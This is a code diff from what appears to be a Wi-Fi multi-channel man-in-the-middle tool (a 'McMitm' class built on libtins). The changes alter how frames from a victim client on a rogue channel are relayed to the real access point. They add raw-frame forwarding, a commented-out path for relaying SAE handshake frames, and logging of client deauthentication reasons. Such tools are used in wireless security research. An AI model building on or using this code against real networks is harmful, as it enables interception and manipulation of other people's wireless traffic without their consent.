@@ -52,8 +52,6 @@ FrameProcess McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
 
 			send_to_rogue(resp);
 			display_traffic(dot11, "Rogue channel", " -- Replied");
-
-			send_to_real(dot11); //TODO  need to be here?
 			client_state.update_state(ClientState::Authenticated);
 			return STOP;
 		}
@@ -150,6 +148,22 @@ void McMitm::power_mgmt_response_rogue(HWAddress<6> addr2, Dot11 &dot11) const {
 }
 
 void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
+	/*if(!pdu) {
+		// Management frame libtins couldn't parse (e.g. SAE commit/confirm body).
+		// Extract addrs from raw 802.11 header and forward client->AP frames to real channel.
+		if(raw.size() >= 4) {
+			const uint16_t rt_len = raw[2] | static_cast<uint16_t>(raw[3]) << 8;
+			if(static_cast<size_t>(rt_len) + 16 <= raw.size()) {
+				const HWAddress<6> addr1(raw.data() + rt_len + 4);
+				const HWAddress<6> addr2(raw.data() + rt_len + 10);
+				if(addr1 == ap.get(SK::mac) && addr2 == client_state.get_mac()) {
+					send_to_real(raw);
+					log(LogLevel::DEBUG, "Rogue channel: raw mgmt frame {} -> real AP", addr2);
+				}
+			}
+		}
+		return;
+	}*/
 	auto *dot11 = pdu->find_pdu<Dot11>();
 	if(!dot11) return;
 
@@ -186,7 +200,9 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const frame_raw_t 
 		}
 	} else if(dot11->addr1() == ap.get(SK::mac)) { // -> AP
 		if(client_state.get_mac() == addr2) {
-			send_to_real(*pdu);
+			if(const auto *deauth = dot11->find_pdu<Dot11Deauthentication>())
+				log(LogLevel::INFO, "Rogue channel: client Deauth reason={}", deauth->reason_code());
+			send_to_real(raw);
 			display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
 			if(dot11->type() == Dot11::DATA && client_state.get_state() < ClientState::GotMitm) {
 				client_state.update_state(ClientState::GotMitm);
